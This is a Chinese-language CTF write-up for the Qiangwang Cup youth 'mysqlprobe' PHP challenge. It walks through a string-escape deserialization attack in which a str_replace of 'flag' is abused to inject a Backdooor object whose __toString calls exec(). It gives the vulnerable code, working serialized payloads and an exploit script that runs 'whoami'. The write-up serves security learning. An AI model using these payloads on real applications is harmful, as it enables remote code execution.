---
title: 强网杯青少年赛mysqlprobe反序列化复现
date: 2024-11-26 10:25 +0800
categories: [CTF,WEB]
tags: [反序列化]
img_path: /assets/images/
---



## 源代码

https://github.com/CTF-Archives/2024qwqsnxbs/blob/main/mysqlprobe.php



## 解析

这里代码化简

```php
<?php
error_reporting(0);
class Mysql {
    public $debug = 1;
    public $database;
    public $hostname;
    public $port;
    public $charset = "utf8";
    public $username;
    public $password;
    public function __construct($database, $hostname, $port, $username, $password) {
        $this->database = $database;
        $this->hostname = $hostname;
        $this->port = $port;
        $this->username = $username;
        $this->password = $password;
    }
    protected function connect() {
        $dsn = "mysql:host=".$this->hostname.";port=".$this->port.";dbname=".$this->database.";charset=".$this->charset;
        $this->pdo = new PDO($dsn, $this->username, $this->password, array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true
        ));
        $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    }
    public function __destruct()
    {
        $this->connect();
    }
}
class Backdooor{
    public $cmd = "whoami    ";
    public function __toString(){
        echo exec($this->cmd);
        return '';
    }
}
```

其实就是 在 dsn 和 pdo 这里都可以触发 backdooor 的__toString()

如果我们直接传 new backdoor，发包过去，代码会把这个类处理成字符串，没有办法去触发后门

就像下面这个样子

```
O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";s:5:"test1";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";O:9:"Backdooor":1:{s:3:"cmd";s:6:"whoami";}}
```

而我们最后要的效果是（注意引号哦）

```
O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";s:5:"test1";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";O:9:"Backdooor":1:{s:3:"cmd";s:6:"whoami";}}
```



在源代码里面是序列化后在反序列化，中间有一步匹配替换，这里是当做字符串来处理的，我们就可以考虑字符逃逸

```php
$mysqlser = str_replace("flag", "", $mysqlser);
```

这里还有一点是，也是我踩雷的点

考虑吞掉字符的时候，不能后面的拼接的payload和你的flag字符防止一个点内，会出现多吞或者吞掉的字符对不上的情况，会error

例子

flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";s:8:"password";O:9:"Backdooor":1:{s:3:"cmd";s:6:"whoami";}}



## exp

所以我们就可以把 flag 字符放到其他的变量里面

这里的思路就是flag替换为空，前面的定义值的长度动不了，就直接往后吞 看加粗斜体

O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";s:6:"test01";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:8:"flagflag***";s:8:"password";s:33:"***";s:8:"password";s:8:"password";}";}

下面就是替换为空的效果

O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";s:6:"test01";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:8:"";s:8:"password";s:33:"";s:8:"password";s:8:"password";}";}

第一个password成了username变量的值了

那我们就可以计算一下长度

```
";s:8:"password";s:33:"
flagflagflagflagflagflag
```

我这里缺了一个字符，我的payload里面多加了一个空格

![cf3886b2dcf13cb9fa867511b36b16e](qwbqsnsmysqlprobe.assets/cf3886b2dcf13cb9fa867511b36b16e.png)

### 测试代码

```php
<?php
error_reporting(0);
class Mysql {
    public $debug = 1;
    public $database;
    public $hostname;
    public $port;
    public $charset = "utf8";
    public $username;
    public $password;
    public function __construct($database, $hostname, $port, $username, $password) {
        $this->database = $database;
        $this->hostname = $hostname;
        $this->port = $port;
        $this->username = $username;
        $this->password = $password;
    }
    protected function connect() {
        $dsn = "mysql:host=".$this->hostname.";port=".$this->port.";dbname=".$this->database.";charset=".$this->charset;
        // echo "\n".$this->password."-----\n";
        try {
            $this->pdo = new PDO($dsn, $this->username, $this->password, array(
                PDO::MYSQL_ATTR_LOCAL_INFILE => true
            ));
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            if ($this->debug) {
                echo "Successful!";
                $this->query("select flag from flag");

            }
        } catch (PDOException $e) {
            if ($this->debug) {
                echo "error";
            }

        }
    }
    public function query($sql) {
        return $this->pdo->query($sql);
    }
    public function __destruct()
    {
        $this->connect();
    }
}
class Backdooor{
    public $cmd;
    public function __toString(){
        echo 11111;
        echo exec($this->cmd);
        return '';
    }
}
// 这里 php8 不能执行出命令，php5 可以
$host = "127.0.0.1";
$username = 'flagflagflagflagflagflag';
$password =' ";s:8:"password";O:9:"Backdooor":1:{s:3:"cmd";s:6:"whoami";}}';
$database = "test01";
$port = 3306;
$mysql = new Mysql($database, $host, $port, $username, $password);
$mysqlser = serialize($mysql);
echo($mysqlser).PHP_EOL;
$mysqlser = str_replace("flag", "", $mysqlser);
echo($mysqlser);
var_dump(unserialize($mysqlser));

// 这串 php8 php5 都可以运行
$host = "127.0.0.1";
$username = 'root';
$password ='";s:8:"hostname";O:9:"Backdooor":1:{s:3:"cmd";s:10:"whoami    ";};s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";s:8:"password";}';
$database = "flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";
$port = 3306;
$mysql = new Mysql($database, $host, $port, $username, $password);
$mysqlser = serialize($mysql);
echo($mysqlser).PHP_EOL;
$mysqlser = str_replace("flag", "", $mysqlser);
echo($mysqlser);
unserialize($mysqlser);
```

![image-20241126102005035](qwbqsnsmysqlprobe.assets/image-20241126102005035.png)



## 学习

### toString 触发学习

```php
<?php
error_reporting(0);
class Mysql {
    public $debug = 1;
    public $database;
    public $hostname;
    public $port;
    public $charset = "utf8";
    public $username;
    public $password;
    public function __construct($database, $hostname, $port, $username, $password) {
        $this->database = $database;
        $this->hostname = $hostname;
        $this->port = $port;
        $this->username = $username;
        $this->password = $password;
    }
    protected function connect() {
        $dsn = "mysql:host=".$this->hostname.";port=".$this->port.";dbname=".$this->database.";charset=".$this->charset;
        $this->pdo = new PDO($dsn, $this->username, $this->password, array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true
        ));
    }
    public function __destruct()
    {
        $this->connect();
    }
}
class Backdooor{
    public function __toString(){
        echo 'toString!';
        return '';
    }
}


$host = new Backdooor();
$username = new Backdooor();
$password = new Backdooor();
$database = new Backdooor();
$port = 3306;

$mysql = new Mysql($database, $host, $port, $username, $password);
$mysqlser = serialize($mysql);
echo $mysqlser;
$mysqlser = str_replace("flag", "", $mysqlser);
unserialize($mysqlser);
```

输出结果

```
O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";O:9:"Backdooor":0:{}s:8:"hostname";O:9:"Backdooor":0:{}s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";O:9:"Backdooor":0:{}s:8:"password";O:9:"Backdooor":0:{}}toString!toString!toString!toString!
```

（这里基础自行理解）



### 反序列化数据覆盖

原始数据

```
O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";s:5:"test1";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";s:8:"password";}
```

我们在正常的序列化值后面加了两个，他会读取后面的数据

```
O:5:"Mysql":9:{s:5:"debug";i:1;s:8:"database";s:5:"test1";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";s:8:"password";s:8:"password";s:3:"pwd";s:8:"username";s:4:"lmds";}
```

代码上测试

```php
<?php
error_reporting(0);
class Mysql {
    public $debug = 1;
    public $database;
    public $hostname;
    public $port;
    public $charset = "utf8";
    public $username;
    public $password;
    public function __construct($database, $hostname, $port, $username, $password) {
        $this->database = $database;
        $this->hostname = $hostname;
        $this->port = $port;
        $this->username = $username;
        $this->password = $password;
    }
}

var_dump(unserialize('O:5:"Mysql":9:{s:5:"debug";i:1;s:8:"database";s:5:"test1";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";s:8:"password";s:8:"password";s:3:"pwd";s:8:"username";s:4:"lmds";}'));
```

输出结果

```
object(Mysql)#1 (7) {
  ["debug"]=>
  int(1)
  ["database"]=>
  string(5) "test1"
  ["hostname"]=>
  string(9) "127.0.0.1"
  ["port"]=>
  int(3306)
  ["charset"]=>
  string(4) "utf8"
  ["username"]=>
  string(4) "lmds"
  ["password"]=>
  string(3) "pwd"
}
```

